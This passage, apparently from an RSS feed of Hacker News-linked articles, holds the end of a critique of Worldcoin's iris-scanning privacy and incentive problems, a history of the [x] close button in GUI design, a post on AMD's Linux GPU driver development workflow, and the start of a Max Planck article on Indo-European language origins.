src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png" width="1456" height="934" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/d9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:934,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:686045,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Excerpt from a Worldcoin </span><a href="https://worldcoin.org/blog/engineering/iris-feature-extraction" rel="">post</a></figcaption></figure></div><p>But simply saying “we transform the iris data into something else” and “we’ll use zero knowledge proofs” should not be sufficient.</p><p><span>It is necessary to understand what kind of data can be leaked from the iris hashing algorithm — an algorithm that the team acknowledges is frequently changing. It is </span><em>also</em><span> necessary to understand what kinds of attacks could be enabled both on the network or on an individual participant if a malicious actor was able to obtain access to a participant’s data, ranging from a person’s WorldID account, to their IrisCode, to their full unhashed iris scan. This is a really critical issue, because there is no “password reset” when it comes to iris data. Questions about account recovery also remain unanswered — in previous reports, a person who uninstalled their World App was never able to regain access to their account.</span></p><p>There are also unanswered questions about the scalability of such an algorithm to the populations that Worldcoin is hoping to reach — past iterations of the algorithm have allowed one person to register multiple times, or have denied people access when they hadn’t already created an ID. While Worldcoin may have developed an algorithm that reliably distinguishes unique irises among its test pool, it’s not clear that it will work with a pool orders of magnitude larger.</p><p><span>As for zero knowledge proofs, Worldcoin trots this out as an answer to concerns about potentially connecting substantial amounts of sensitive data (transaction history and so forth) to a single permanent identifier. ZK proofs are a way of proving that something is true (e.g., “I have a valid World ID”, or “I’ve not yet received my WLD distribution this week”) without revealing additional details (e.g., which World ID is mine). But the implementation of this would be critical, and much of the burden here would lie on third parties — corporations, governments, etc. — that Worldcoin envisions adopting their system. A permanent record of potentially incredibly sensitive transaction histories, irrevocably linked to a biometric identifier, is a nightmare scenario. Worldcoin acknowledges this issue with no further elaboration: “While the Protocol is made to be used in a privacy-preserving manner, privacy cannot be enforced outside of the Protocol.”</span></p><p>Furthermore, Worldcoin relies heavily on each user’s ability and technical know-how to keep track of their private key, writing, “private keys need to remain private, as otherwise, a user can deanonymize themselves, even to actions they have performed in the past“.</p><p><span>Anti-surveillance advocate and Nym co-founder Harry Halpin describes Worldcoin’s knee-jerk “ZK proofs!” dismissal of privacy concerns — a </span><a href="https://twitter.com/molly0xFFF/status/1629730719437078529" rel="">frequent habit in the wider crypto world</a><span> — as “zero-knowledge washing“: “taking a fundamentally evil concept or dubious concept and trying to make it look socially acceptable by adding some zero-knowledge fairy dust on top of it.” He also expresses doubts about the longevity of ZK proofs, expecting “quantum computing [to] break zero-knowledge proofs“ in five to ten years,</span></p><p><span> though he and I differ somewhat on that particular prediction.</span></p><p><span>Those who resist Worldcoin’s initial rebuttals and continue to push the company on privacy concerns are then faced with Worldcoin’s next tactic: arguing that we </span><em>already</em><span> give up privacy in today’s society, so what’s a little more? Spokespeople trot out whataboutism with Apple and Google biometric scanning, and various backers argue that iris images are already widely distributed: “You have a headshot on your website. You walk around with your eyes open in front of cameras all day long.“</span></p><p><span>And if that doesn’t work? Well, there’s always investor Kyle Samani’s argument: “When it comes to Worldcoin, you don’t have to scan your eyeball. Like if you don’t want to, then fucking don’t.”</span></p><p><span> This option is reasonable — indeed, quite tempting — if Worldcoin is relegated to the realm of the trivial, enabling NFT airdrops and the like. When it comes to more important use cases, “optional” biometrics suddenly become much more problematic. For example, in India, HIV patients have found themselves needing to submit their “optional” biometrics-linked Aadhaar identification number in order to access antiretroviral therapies.</span></p><p><span>It’s not yet clear how Worldcoin envisions WLD functioning. They refer to it as a “digital currency” which “could… become the widest distributed digital asset”. If Worldcoin is to function as a currency, as you might expect of an asset that’s being distributed in a universal basic income program, it would need to overcome the same types of issues that keep Bitcoin from functioning </span><a href="https://en.wikipedia.org/wiki/Economics_of_bitcoin#Classification" rel="">anything like a currency</a><span>.</span></p><p>If it is to be more of a speculative asset that people hoard in hopes of the price going up, it seems ill-suited to Worldcoin’s UBI ambitions.</p><p><span>Furthermore, the initial token distribution looks a lot more like what you would expect out of the venture capital world than out of a public good organization. Worldcoin has generously reserved for insiders 25% of the WLD supply (up from an initial 20%, because development was evidently more “complex and costly” than anticipated).</span></p><p><span>It stands to reason that Worldcoin’s token distribution looks VC backed, and that’s because it is. In May, Worldcoin raised $115 million in a Series C round led by Blockchain Capital and joined by Bain Capital Crypto, Distributed Global, and, of course, </span><a href="https://newsletter.mollywhite.net/p/andreessen-horowitzs-state-of-crypto" rel="">Andreessen Horowitz</a><span>.</span></p><p><span> One wonders how they will balance their do-gooder mission with their need to generate massive returns for their backers.</span></p><p>Worldcoin’s loftier goals include “enabl[ing] global democratic processes”, providing global access to financial services, and even paying out AI-funded global universal basic income.</p><p>That is, if you have a smartphone and the technical know-how to use it, Internet connectivity, and access to an Orb. For Worldcoin’s more financial ambitions, people would also need access to an exchange where they could swap WLD for their local currency, or WLD would need to be widely adopted as a form of payment by merchants.</p><p><span>Today, an estimated 66% of the world uses a smartphone.</span></p><p><span> Around the same percentage has access to the Internet, but this varies immensely by region, and is impacted by other factors including wealth and gender.</span></p><p><span>Access to Orbs is a much more existential issue for the project: there are 346 Orbs out there in the world right now: that is one per every 23 million people. Worldcoin announced they will be rolling out</span></p><p><span> more Orbs to reach a total number of 1,500 — meaning that then a mere 5.3 million people would have to travel to and line up per Orb.</span></p><p><span> Sam Altman has recently boasted (without evidence) that one person is being signed up every eight seconds.</span></p><p><span> With their claimed two million signups as a head start, at that rate they’ll have all 8 billion people in the world signed up by 2055 (assuming no population change, or change in rate of signup).</span></p><p>Finally, if Worldcoin truly wishes to onboard every person in the world, or be used for critical tasks, they will at some point have to grapple with the fact that not everyone has irises that can be scanned, due to factors including birth defects, surgeries, or disease.</p><p>“Show me the incentive and I'll show you the outcome,” says Charlie Munger.</p><p>What will happen when you promise people anywhere from $10 to $100 for scanning their eyeball? What if that’s not dollars, but denominated in a crypto token, making it appealing to speculators? And what if some people don’t have the option to scan their own eyeballs to achieve access to it?</p><p><span>A black market for Worldcoin accounts has </span><a href="https://web3isgoinggreat.com/?id=sam-altmans-worldcoin-project-incentivizes-a-black-market-for-biometric-data-taken-from-people-in-developing-nations" rel="">already emerged</a><span> in Cambodia, Nigeria, and elsewhere, where people are being paid to sign up for a World ID and then transfer ownership to buyers elsewhere — many of whom are in China, where Worldcoin is restricted. There is no ongoing verification process to ensure that a World ID </span><em>continues</em><span> to belong to the person who signed up for it, and no way for the eyeball-haver to recover an account that is under another person’s control. Worldcoin acknowledges that they have no clue how to resolve the issue: “Innovative ideas in mechanism design and the attribution of social relationships will be necessary.“ The lack of ongoing verification also means that there is no mechanism by which people can be removed from the program once they pass away, but perhaps Worldcoin will add survivors’ benefits to its list of use cases and call that a feature.</span></p><p>Relatively speaking, scanning your iris and selling the account is fairly benign. But depending on the popularity of Worldcoin, the eventual price of WLD, and the types of things a World ID can be used to accomplish, the incentives to gain access to others’ accounts could become severe. Coercion at the individual or state level is absolutely within the realm of possibility, and could become dangerous.</p><p>Worldcoin seems to be embracing a modified version of the “move fast and break things” mantra that has become all too popular in the tech world. “Build a massive database of biometric data and then figure out what to do with it someday” is a little less catchy, though.</p><p>The issues with Worldcoin that I list here are far from exhaustive, and I’ve included some further reading below from others who’ve shared their thoughts.</p><ul><li><p><span>Vitalik Buterin, “</span><a href="https://vitalik.ca/general/2023/07/24/biometric.html" rel="">What do I think about biometric proof of personhood?</a><span>” July 24, 2023.</span></p></li><li><p><span>“</span><a href="https://blockworks.co/news/worldcoin-privacy-concerns" rel="">Worldcoin isn’t as bad as it sounds: It’s worse</a><span>”. </span><em>Blockworks</em><span>, July 26, 2023.</span></p></li></ul><ul><li><p><span>Molly White, “</span><a href="https://blog.mollywhite.net/is-acceptably-non-dystopian-self-sovereign-identity-even-possible/#verifiable-attestations" rel="">Is "acceptably non-dystopian" self-sovereign identity even possible?</a><span>” June 10, 2022. </span></p></li><li><p><span>Richard Nieva and Aman Sethi, “</span><a href="https://www.buzzfeednews.com/article/richardnieva/worldcoin-crypto-eyeball-scanning-orb-problems" rel="">Worldcoin Promised Free Crypto If They Scanned Their Eyeballs With ‘The Orb.’ Now They Feel Robbed.</a><span>” BuzzFeed News, April 5, 2022.</span></p></li><li><p><span>Eileen Guo and Adi Renaldi, “</span><a href="https://www.technologyreview.com/2022/04/06/1048981/worldcoin-cryptocurrency-biometrics-web3/" rel="">Deception, exploited workers, and cash handouts: How Worldcoin recruited its first half a million test users</a><span>”. MIT Technology Review, April 6, 2022.</span></p></li></ul></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[X to Close – The origins of the use of [x] in UI design. (2014) (136 pts)]]></title>
            <link>https://medium.com/re-form/x-to-close-417936dfc0dc</link>
            <guid>36931344</guid>
            <pubDate>Sun, 30 Jul 2023 14:16:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://medium.com/re-form/x-to-close-417936dfc0dc">https://medium.com/re-form/x-to-close-417936dfc0dc</a>, See on <a href="https://news.ycombinator.com/item?id=36931344">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="subtitle">The origins of the use of [x] in UI design.</h2><div><a rel="noopener follow" href="https://medium.com/@laurenarcher?source=post_page-----417936dfc0dc--------------------------------"><div aria-hidden="false"><p><img alt="Lauren Archer" src="https://miro.medium.com/v2/resize:fill:88:88/0*HsX1xYPTYOkPoGvf.jpeg" width="44" height="44" loading="lazy"></p></div></a><a href="https://medium.com/re-form?source=post_page-----417936dfc0dc--------------------------------" rel="noopener follow"><div aria-hidden="false"><p><img alt="re:form" src="https://miro.medium.com/v2/resize:fill:48:48/1*IwSEKGLwbf_w_3kwfzIU8Q.jpeg" width="24" height="24" loading="lazy"></p></div></a></div></div><div><figure><a href="http://ad.doubleclick.net/ddm/trackclk/N8295.1674088NATIV.LY/B8154727.110922782;dc_trk_aid=283990515;dc_trk_cid=58990176"></a></figure><p id="ddbc">X’s are everywhere in user interface (UI) design. A powerful symbol, [x] is capable of closing windows and popups, toolbars and tabs and anything else that might otherwise be cluttering up your screen.</p><figure><figcaption>Twitter X</figcaption></figure><p id="8565">Clicking on [x] to close a feature has become an instinctual part of using a computer and a standard in web and software design. Although it may seem like the ubiquitous [x] has always been a part of Graphical User Interfaces (GUI), a quick jaunt through the history of GUIs reveals that this actually isn’t the case.</p><p id="c6cd">So where and when did the [x] first enter into the UI lexicon?</p><figure><figcaption>Chrome X</figcaption></figure><p id="a461">To track the [x] back to its origin, let’s start with the status quo: Microsoft.</p><p id="2983">If you are using Windows then you should be able to spot at least one [x] on your screen right now.</p><figure><figcaption>Windows 7 X</figcaption></figure><p id="94cc">But <a href="http://toastytech.com/guis/win101.html" rel="noopener ugc nofollow" target="_blank">Windows 1.0</a> didn’t use an [x] to close.</p><figure><figcaption>Windows 1.0</figcaption></figure><p id="a2b1"><a href="http://toastytech.com/guis/win203.html" rel="noopener ugc nofollow" target="_blank">Nor did 2.0.</a></p><figure><figcaption>Windows 2.0</figcaption></figure><p id="f9fd"><a href="http://toastytech.com/guis/win30.html" rel="noopener ugc nofollow" target="_blank">Or 3.0?</a></p><figure><figcaption>Windows 3.0</figcaption></figure><p id="8fd3">The [x] button didn’t show up until <a rel="noopener" href="https://medium.com/">Windows 95</a>, when the close button was moved to the right hand side, joining minimize and maximize.</p><figure><figcaption>Windows 95</figcaption></figure><p id="7795">There is even evidence that this was a late addition to Windows 95. In this early demo (Codename: Chicago), the minimize and maximize buttons have been redesigned, but the close button remains the same, and to the left as before.</p><figure><figcaption>Windows Chicago<br>August 1993</figcaption></figure><p id="e939">So, who was responsible for this last minute change? As far as I can tell, this person is responsible for the proliferation and widespread use of [x] in UI design today.</p><p id="6839">The intent of Windows 95 was always to get a computer on every desk and in every home. Design changes from Windows 3.0 were made specifically in response to usability feedback. The goal was to ensure that any computer novice would be able to learn Windows 95.</p><p id="4365">It worked.</p><p id="f699">Windows 95 eliminated all other OS competition, and was adopted by businesses and for home use worldwide.</p><p id="c0d3">But our goal today isn’t to pinpoint when the [x] became popular, but rather to find out when it first entered into UI design.</p><p id="131c">Can we find an earlier example of [x] in a GUI?</p><p id="beca"><a href="http://toastytech.com/guis/indexos2.html" rel="noopener ugc nofollow" target="_blank">Mac OS </a>didn’t use an [x] to close. Only in OS X did an [x] first appear, and then only when you hover over the red close button.</p><figure><figcaption>Mac OS 2: Pretty Colours!</figcaption></figure><p id="816c">And <a href="http://whiteandnoisy.org/linux.html" rel="noopener ugc nofollow" target="_blank">Linux GUI’s</a> started to use the [x] symbol only after the release of Windows 95.</p><figure><figcaption>X Window System</figcaption></figure><p id="dd2b">We aren’t getting very far this way, so let’s go back to the very beginning. Back before Windows or Linux or Mac OS. Back to the very first GUI to fully utilize the <a href="http://en.wikipedia.org/wiki/Desktop_metaphor" rel="noopener ugc nofollow" target="_blank">‘desktop metaphor’</a> that we are all so familiar with: The 8010 Information System from Xerox.</p><figure><figcaption>Xerox 8108</figcaption></figure><p id="c78d">Also known as “The Xerox Star”, “ViewPoint”, or “GlobalView”, Xerox started the development of the 8101 in 1977 and first sold the system in 1981 as “Dandelion”. This is the GUI that Apple allegedly modeled their Lisa/Mac OS after, inspired by a tour of the Xerox headquarters in December 1979.</p><p id="a2a1">No [x], though:</p><figure><figcaption>Xerox Star</figcaption></figure><p id="d51f">Recall that no [x] appears in early Apple operating systems either:</p><figure><figcaption>Mac OS 1</figcaption></figure><p id="ee28">There is no [x] to be found in the<a href="http://toastytech.com/guis/vision.html" rel="noopener ugc nofollow" target="_blank"> Visi On GUI</a>, the first integrated graphical software environment for IBM PCs, released in 1983:</p><figure><figcaption>Visi On</figcaption></figure><p id="f143">The<a href="http://toastytech.com/guis/gem11.html" rel="noopener ugc nofollow" target="_blank"> GEM user interface</a>, developed by Digital Research for and DOS-based computers in 1984, didn’t have an [x]:</p><figure><figcaption>GEM</figcaption></figure><p id="b758">But! What is this? Could it be?</p><figure><figcaption>Atari TOS 1.0</figcaption></figure><p id="5788">This is a screenshot of <a href="http://toastytech.com/guis/tos.html" rel="noopener ugc nofollow" target="_blank">Atari TOS 1.0</a>. Built on top of GEM to be ported to the Atari ST in 1985, from the computers division of Atari Corp. It is the earliest example of the [x] button I’ve been able to find.</p><p id="1e8d">So why here? Why now?</p><p id="3d58">This may be another example of Atari, an American company, borrowing from Japanese culture. The first example, of course, being the name Atari itself, a Japanese term from the game Go that means “to hit the target”.</p><p id="b68c">The use of [x] for close and [o] for open could come from the Japanese symbols batsu and maru.</p><figure><figcaption>Maru (o) and Batsu (x)</figcaption></figure><p id="51eb">Batsu (x) is the symbol for incorrect, and can represent false, bad, wrong or attack, while maru (o) means correct, true, good, whole, or something precious. Batsu and maru are also common hand gestures. Cross your arms over your chest for batsu, circle your arms over your head for maru.</p><figure><figcaption>Playstation Controller</figcaption></figure><p id="3ce3">Another familiar example of batsu/maru is in the Playstation controller design, where maru and batsu are used for yes and no.</p><p id="6b38">This is just a theory, however. Not being there myself at the time, I can’t be sure.</p><p id="f3c1">For the sake of being thorough let’s see if we can go back any further.</p><p id="dae2">The first line-based text editor was Quick Editor or <a href="http://cm.bell-labs.com/who/dmr/qedman.html" rel="noopener ugc nofollow" target="_blank">qed</a>, written by Ken Thompson in 1965, who later helped to develop Unix. Qed uses [q] for the quit command.</p><p id="a094">Early text editors used a bunch of different escape commands: [q], [e], [c], and [ESC], but [x] was never a popular option. <a href="https://www.google.ca/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;cd=3&amp;cad=rja&amp;ved=0CEAQFjAC&amp;url=http%3A%2F%2Fwww.gnu.org%2Fs%2Fed%2Fmanual%2Fed_manual.html&amp;ei=AUP5UtfrIeTW2AW5_oGoCw&amp;usg=AFQjCNFF6ETHooKV-YRiBoPd7_EZp3R65w&amp;sig2=p8wLvQ4lnpi9P06efsJObA&amp;bvm=bv.61190604%2Cd.b2I" rel="noopener ugc nofollow" target="_blank">Ed</a>, em and <a href="http://pic.dhe.ibm.com/infocenter/zos/v1r13/index.jsp?topic=%2Fcom.ibm.zos.r13.bpxa500%2Fex.htm" rel="noopener ugc nofollow" target="_blank">ex</a>, early text editors spawned from qed around 1971, didn’t use [x.]</p><p id="ef8a"><a href="http://ex-vi.sourceforge.net/vi.html" rel="noopener ugc nofollow" target="_blank">Vi</a>, <a href="http://www.radford.edu/~mhtay/CPSC120/VIM_Editor_Commands.htm" rel="noopener ugc nofollow" target="_blank">vim</a>, <a href="http://www.cs.colostate.edu/helpdocs/emacs.html" rel="noopener ugc nofollow" target="_blank">emacs</a> or <a href="http://help.fdos.org/en/hhstndrd/base/edlin.htm" rel="noopener ugc nofollow" target="_blank">edlin</a>?</p><p id="f0f0">No [x] to close these 1980's text editors either. X was commonly used to delete characters in-line, but not to close the program.</p><p id="1cf0">[x] is a true icon, not representing a letter but representing an action, and only adopted to represent ‘close’ well after the development of graphics-oriented operating systems. The first appearance of [x] in GUI design was likely the Atari TOS, possibly influenced by the Japanese batsu and maru conventions. Thanks to a last minute design change in Windows 95, and the mass adoption of Windows worldwide, [x] has become the standard symbol for ‘close’, a symbol that dominates web, app and software design today.</p><p id="eff7">That’s all for now.</p><p id="1d60">[x]</p><p id="a1ca"><em>Screenshots from </em><a href="http://toastytech.com/guis/" rel="noopener ugc nofollow" target="_blank"><em>http://toastytech.com/guis/</em></a><em> and </em><a href="http://whiteandnoisy.org/" rel="noopener ugc nofollow" target="_blank"><em>http://whiteandnoisy.org/</em></a></p><p id="c186">UPDATE:</p><p id="bbb0">So this little article has travelled pretty far! There were <a href="https://news.ycombinator.com/item?id=8171340" rel="noopener ugc nofollow" target="_blank">a lot of good tips, comments and insights</a> into the origin of [x] but none as good as this email that I received from Windows 95 team member Daniel Oran.</p><p id="46ae"><em>“Hi Lauren,</em></p><p id="9e64"><em>A friend forwarded me your Medium piece, “X to Close.” He remembered that I had worked on Windows 95 at Microsoft — I </em><a href="http://patft.uspto.gov/netacgi/nph-Parser?patentnumber=5757371" rel="noopener ugc nofollow" target="_blank"><em>created</em></a><em> the Start Button and Taskbar — and thought I’d be amused. I was! :-)</em></p><p id="63cd"><em>It’s fun to see how history gets written when you actually lived those long-ago events. I joined Microsoft in 1992 as a program manager for the user interface of “Chicago,” which was the code name for what eventually became Windows 95.</em></p><blockquote><p id="ee13"><strong><em>So, who was responsible for this last minute change? As far as I can tell, this person is responsible for the proliferation and widespread use of [x] in UI design today.</em></strong></p></blockquote><p id="c4a6"><em>It wasn’t a last-minute change. During 1993, we considered many variations of the close-button design. And the source wasn’t Atari. It was </em><a href="http://vimeo.com/30110130" rel="noopener ugc nofollow" target="_blank"><em>NeXT</em></a><em>, which had an X close button in the upper right, along with the grayscale faux-3D look that we borrowed for Windows 95.</em></p><p id="fc0e"><em>I wanted to put the Windows X close button in the upper left, but that conflicted with the existing Windows Alt-spacebar menu and also a new program icon, which we borrowed from</em><a href="http://www.os2museum.com/wp/?page_id=112" rel="noopener ugc nofollow" target="_blank"><em>OS/</em></a><em>2, on which Microsoft had originally partnered with IBM.</em></p><p id="82cf"><em>Attached is the earliest Chicago bitmap I could find that includes an X close button. It’s dated 9/22/1993. (In attaching the file to this email, I just realized that it’s so old that it has only an eight-character name. Before Windows 95, that was the limit.)</em></p><p id="5ce0"><em>Thanks for your very entertaining essay!</em></p><p id="6877"><em>Best,</em></p><p id="b15c"><em>Danny”</em></p><figure><figcaption><em>Windows Chicago 9/22/1993.</em></figcaption></figure><p id="a74c">I guess you could say case [x]ed.</p><figure><figcaption><a href="http://vimeo.com/30110130" rel="noopener ugc nofollow" target="_blank">N</a>eXT 1988</figcaption></figure><p id="0c79"><a href="https://news.ycombinator.com/item?id=8171340" rel="noopener ugc nofollow" target="_blank">Thanks again to everyone who helped track down earlier examples of GUIs and early text editors that used [x] to close as well.</a> Fascinating!</p><p id="af24"><em>This story was originally published by Lauren Archer on February 10, and was added to the re:form collection today because we loved Lauren’s smart take on UI design.</em></p><figure><a href="http://www.medium.com/re-form"></a></figure><p id="15a9"><em>You can follow Lauren Archer on Twitter at @</em><a href="https://twitter.com/laurenarcher" rel="noopener ugc nofollow" target="_blank"><em>laurenarcher</em></a><em>. Subscribe to re:form’s </em><a href="https://medium.com/feed/re-form" rel="noopener"><em>RSS feed</em></a><em>, sign up to receive our stories </em><a href="http://eepurl.com/Z84dH" rel="noopener ugc nofollow" target="_blank"><em>by email</em></a><em>, and follow the main page </em><a href="https://medium.com/re-form" rel="noopener"><em>here</em></a><em>.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Long History of Nobody Wants to Work Anymore (288 pts)]]></title>
            <link>https://mstdn.ca/@paulisci/110798058470040619</link>
            <guid>36931129</guid>
            <pubDate>Sun, 30 Jul 2023 13:49:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mstdn.ca/@paulisci/110798058470040619">https://mstdn.ca/@paulisci/110798058470040619</a>, See on <a href="https://news.ycombinator.com/item?id=36931129">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[A dive into the AMD driver workflow (137 pts)]]></title>
            <link>https://geohot.github.io//blog/jekyll/update/2023/06/07/a-dive-into-amds-drivers.html</link>
            <guid>36930795</guid>
            <pubDate>Sun, 30 Jul 2023 13:06:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://geohot.github.io//blog/jekyll/update/2023/06/07/a-dive-into-amds-drivers.html">https://geohot.github.io//blog/jekyll/update/2023/06/07/a-dive-into-amds-drivers.html</a>, See on <a href="https://news.ycombinator.com/item?id=36930795">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I ended up getting a response from high level people at AMD. It was still very light on any real technical information, but it did include some great phrases like “I am able to replicate the issues you are facing” and some mockable phrases like “We are hoping that this will improve your perception of AMD products and this will be reflected in your public messaging.”</p>

<p>Though they did end up sending me a ROCm 5.6 driver tarball that seems to be able to run <a href="https://github.com/RadeonOpenCompute/rocm_bandwidth_test">rocm_bandwidth_test</a> and <a href="https://github.com/ROCm-Developer-Tools/HIP-Examples/tree/master/gpu-burn">gpu-burn</a> in loops on 2x 7900XTX. So it fixed the main reported issue! Sadly, they asked me not to distribute it, and gave no more details on what the issue is.</p>

<p>A note culturally, I do sadly feel like what they responded to was <i>george is upset and saying bad things about us which is bad for our brand</i> and not <i>holy shit we have a broken driver released panicing thousands of people’s kernels and crashing their GPUs</i>. But it’s a start.</p>

<p>Let’s say, tentatively, that the AMD on MLPerf plan is back on, as I trust they will release this fixed driver.</p>

<hr>


<p>AMD has two drivers, “amdgpu” and “AMDGPU-Pro”, henceforth “Pro”</p>

<p>Oddly, they appear to both be open source, at least in kernel land, but only amdgpu is in the Linux kernel in <code>drivers/gpu/drm/amd</code>. Pro is packaged as part of ROCm in <a href="https://repo.radeon.com/amdgpu/5.5.1/ubuntu/pool/main/a/amdgpu-dkms/">dkms debs</a>. These are the subfolders</p>

<ul>
  <li>acp</li>
  <li>amdgpu</li>
  <li>amdkcl (Pro only)</li>
  <li>amdkfd</li>
  <li>backport (Pro only)</li>
  <li>display</li>
  <li>dkms (Pro only)</li>
  <li>include</li>
  <li>pm</li>
</ul>

<p>So amdgpu appears to be a subset of Pro.</p>

<p>They also release a git repo for the Pro driver, called <a href="https://github.com/RadeonOpenCompute/ROCK-Kernel-Driver">ROCK-Kernel-Driver</a>.</p>

<ul>
  <li><a href="https://github.com/RadeonOpenCompute/ROCK-Kernel-Driver/tree/rocm-5.5.0/drivers/gpu/drm/amd">6.0.5.50500-1581431</a></li>
  <li><a href="https://github.com/RadeonOpenCompute/ROCK-Kernel-Driver/tree/rocm-5.5.1/drivers/gpu/drm/amd">6.0.5.50501-1593694</a></li>
  <li>6.1.5.50600-1602498 (the beta version they gave me)</li>
</ul>

<p>Sadly, the public repo is not kept up to date, the last commit was on Apr 19.</p>

<hr>


<p>I also know there’s more after Apr 19, because there’s an <a href="https://lists.freedesktop.org/mailman/listinfo/amd-gfx">amd-gfx</a> mailing list! These amdgpu commits are merged into amd-staging-drm-next. Arch even has an <a href="https://aur.archlinux.org/packages/linux-amd-staging-drm-next-git">AUR</a> for it.</p>

<ul>
  <li><a href="https://github.com/torvalds/linux/tree/master/drivers/gpu/drm/amd">amdgpu in trunk</a></li>
  <li><a href="https://gitlab.freedesktop.org/agd5f/linux/-/tree/amd-staging-drm-next/drivers/gpu/drm/amd">amdgpu in amd-staging-drm-next</a></li>
</ul>

<p>I got the amd-staging-drm-next kernel built on Ubuntu, but example ROCm apps refused to run at all. It’s worth investigating exactly what the differences between the ROCK-Kernel-Driver (Pro) and mainline linux trees (amdgpu) are. I’ll add links if anyone has them.</p>

<hr>


<p>My ask to AMD, why keep the real driver development workflow closed source?</p>

<p>Before my <a href="https://www.youtube.com/watch?v=Mr0rWJhv9jU">big AMD driver rant</a>, I built master from <a href="https://github.com/RadeonOpenCompute/ROCK-Kernel-Driver">ROCK-Kernel-Driver</a> (because it’s rude to complain before you try master). I didn’t understand it was actually just the same as amdgpu-dkms from 5.5. Had the 5.6 stuff from the private tarball been pushed, the building of master would have fixed my issues.</p>

<p>Let’s make the driver developed in the open! Cathedral style is no better than <a href="https://github.com/NVIDIA/open-gpu-kernel-modules">NVIDIA</a>. And in order to beat them, you must be playing to win, not just playing not to lose. Combine the driver openness with public <a href="https://www.intel.com/content/www/us/en/docs/graphics-for-linux/developer-reference/1-0/alchemist-arctic-sound-m.html">hardware docs</a> and you have a competitive advantage.</p>


  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New insights into the origin of the Indo-European languages (211 pts)]]></title>
            <link>https://www.mpg.de/20666229/0725-evan-origin-of-the-indo-european-languages-150495-x</link>
            <guid>36930321</guid>
            <pubDate>Sun, 30 Jul 2023 12:03:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.mpg.de/20666229/0725-evan-origin-of-the-indo-european-languages-150495-x">https://www.mpg.de/20666229/0725-evan-origin-of-the-indo-european-languages-150495-x</a>, See on <a href="https://news.ycombinator.com/item?id=36930321">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
  
  
  <p>Linguistics and genetics combine to suggest a new hybrid hypothesis for the origin of the Indo-European languages</p>
  

  

  <p>An international team of linguists and geneticists led by researchers from the Max Planck Institute for Evolutionary Anthropology in Leipzig has achieved a significant breakthrough in our understanding of the origins of Indo-European, a family of languages spoken by nearly half of the world’s population.</p>
  
  
<figure data-description="A hybrid hypothesis for the origin and spread of the Indo-European languages. The language family began to diverge from around 8100 years ago, out of a homeland immediately south of the Caucasus. One migration reached the Pontic-Caspian and Forest Steppe around 7000 years ago, and from there subsequent migrations spread into parts of Europe around 5000 years ago." data-picture="base64;<picture class="" data-iesrc="/20667325/original-1690297060.jpg?t=eyJ3aWR0aCI6MTQwMCwiZmlsZV9leHRlbnNpb24iOiJqcGciLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--dd8ea4ce53e785c11ff182e1b16e60204a1c3e1d" data-alt="A hybrid hypothesis for the origin and spread of the Indo-European languages. The language family began to diverge from around 8100 years ago, out of a homeland immediately south of the Caucasus. One migration reached the Pontic-Caspian and Forest Steppe around 7000 years ago, and from there subsequent migrations spread into parts of Europe around 5000 years ago." data-class=""><source media="(max-width: 767px)" srcset="/20667325/original-1690297060.webp?t=eyJ3aWR0aCI6NDE0LCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--a6895bf05f58d993a02b1e907e2b84d2e5a86f24 414w, /20667325/original-1690297060.webp?t=eyJ3aWR0aCI6Mzc1LCJmaWxlX2V4dGVuc2lvbiI6IndlYnAiLCJvYmpfaWQiOjIwNjY3MzI1fQ%3D%3D--8f5238ac864dd928701b937c6afb26f2af9183e6 375w, 